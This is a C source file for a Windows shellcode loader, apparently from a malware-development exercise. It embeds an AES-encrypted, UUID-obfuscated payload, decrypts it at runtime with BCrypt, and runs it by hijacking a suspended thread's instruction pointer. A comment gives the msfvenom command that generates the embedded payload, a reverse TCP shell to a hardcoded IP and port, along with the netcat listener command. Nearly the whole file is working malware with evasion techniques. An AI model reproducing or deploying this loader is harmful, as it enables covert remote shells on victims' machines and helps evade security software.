#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#define KEYSIZE				32
#define IVSIZE				16

#define NumberOfElements 29

unsigned char pKey[] = {
        0xD8, 0x13, 0x4D, 0xCE, 0xEA, 0x2B, 0x5B, 0xE7, 0x1C, 0x5C, 0xB2, 0x62, 0x66, 0x90, 0x25, 0x1D,
        0x3E, 0x31, 0x06, 0x6D, 0xB0, 0xEB, 0xDF, 0x08, 0xB1, 0xB4, 0x62, 0x23, 0xB1, 0x0A, 0xA3, 0xD7 };


unsigned char pIv[] = {
        0xB9, 0x4F, 0x7E, 0x0A, 0x48, 0x5A, 0x73, 0x27, 0x40, 0xC2, 0x8A, 0x3E, 0x29, 0xC3, 0x97, 0x25 };

// payload ; msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin
// listner ; nc -nlvp 4444 (on the 192.168.16.111 machine)

char* UuidArray[] = {
		"E7BE3EEE-BFA9-C69D-1E1A-381D043CF221", "65A85DA3-1859-7820-3E76-FCD42F54FDF6", "C4705766-1826-F79C-4CA6-565A5EDD4D07",
        "31AF927D-7B9B-7BB3-9AAA-882457AB8547", "E9616066-C1F0-113C-8503-3FA97B47B285", "3489C88D-675B-5696-61C8-E69D9E0BE849",
        "3F890F7A-018E-434C-2F4A-95A441F4A93A", "F7FC5802-F2F0-14DB-296F-08AFF396BFCF", "4847F487-5DCA-D15E-64E9-3AF5D9418AD3",
        "B6AB4FE1-6FE2-28AC-946B-4ED7E44269FB", "40A8E18E-C4D9-93CD-3978-FDC953361FD4", "90E2C27C-6680-7EEA-6998-CEFFBD63CEF2",
        "DEECE297-A296-B564-02DE-91E6F72E1F71", "D65A9790-4B79-32D6-E188-3779FAC8F35B", "2CF4B2D0-1E6A-7369-3A81-12BC0BA08AB1",
        "A38B11FF-D1DD-5071-B261-3B8DFEEBF0A0", "A0DF1276-7266-319D-601B-45E981E5D29F", "BBDE5142-C993-42D0-C084-9343C8EE79AC",
        "DA2B675E-BA27-6BBC-39A5-802B703B189D", "483A492B-6CC1-1317-FA52-283D1502F42B", "ADF0E6F5-161C-140F-6A7E-AF033D04D58D",
        "A978FB0D-BDDF-6F76-94EF-8DD500FEA163", "7C33FA90-88E7-5D65-6647-243AE4643370", "12908209-F5F7-AD66-1D1B-5A6E4031C73C",
        "2AA0DB71-9921-718D-3DD5-9101973362EA", "3EF71051-45E8-FD2D-9F8A-99F760837078", "C1946D55-D8CC-2AC9-216F-82AB1F9B8FC5",
        "BC022904-A92F-EE51-0ED9-9F487770629A", "86E30968-DB07-450F-F53E-9BC0BE903121"
};

typedef struct _AES {

	PBYTE	pPlainText;				// Base address of the plaintext data 
	DWORD	dwPlainSize;			// Size of the plaintext data

	PBYTE	pCipherText;			// Base address of the encrypted data	
	DWORD	dwCipherSize;			// Size of the encrypted data. This can vary from dwPlainSize when there is padding involved.

	PBYTE	pKey;					// The 32 byte key
	PBYTE	pIv;					// The 16 byte IV

}AES, * PAES;

// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

	BOOL				bSTATE = TRUE;

	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;

	ULONG				cbResult = NULL;
	DWORD				dwBlockSize = NULL;
	DWORD				cbKeyObject = NULL;
	PBYTE				pbKeyObject = NULL;

	PBYTE				pbPlainText = NULL;
	DWORD				cbPlainText = NULL,

		// Intializing "hAlgorithm" as AES algorithm Handle
		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating enough memory for the output buffer, cbPlainText
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Running BCryptDecrypt again with pbPlainText as the output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Clean up
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbPlainText != NULL && bSTATE) {
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;

}

// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pCipherText = pCipherTextData,
		.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}


// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
                TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}


// dummy function to use for the sacrificial thread
VOID DummyFunction() {

	// stupid code
	int		j		= rand();
	int		i		= j * j;

}


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID		pAddress				= NULL;
	DWORD		dwOldProtection			= NULL;

	// .ContextFlags can be CONTEXT_CONTROL or CONTEXT_ALL as well (this will add more information to the context retrieved)
	CONTEXT		ThreadCtx				= { 
								.ContextFlags = CONTEXT_CONTROL 
	};

	// Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);
	memset(pPayload, '\0', sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;


	/*
		- in case of a x64 payload injection : we change the value of `Rip`
		- in case of a x32 payload injection : we change the value of `Eip`
	*/

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}


int main() {

    PBYTE	Bytes = NULL;
    SIZE_T	Size = NULL;

	// Now UuidArray contains the UUIDs read from the web server

    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
        return -1;
    }

	// defining two variables, that will be used in SimpleDecryption, (the output buffer and its size)
	PVOID	pPlaintext = NULL;
	DWORD	dwPlainSize = NULL;

	// decryption
	if (!SimpleDecryption((PVOID)Bytes, (DWORD)Size, pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}

    printf("[i] Bytes : 0x%p \n", pPlaintext);

	HANDLE		hThread		= NULL;
	DWORD		dwThreadId	= NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE) &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
	// hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, (PBYTE)pPlaintext, (SIZE_T)dwPlainSize)) {
		return -1;
	}
	printf("[+] DONE \n");

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	// resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);
	
	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	CloseHandle(hThread);

	return 0;
}










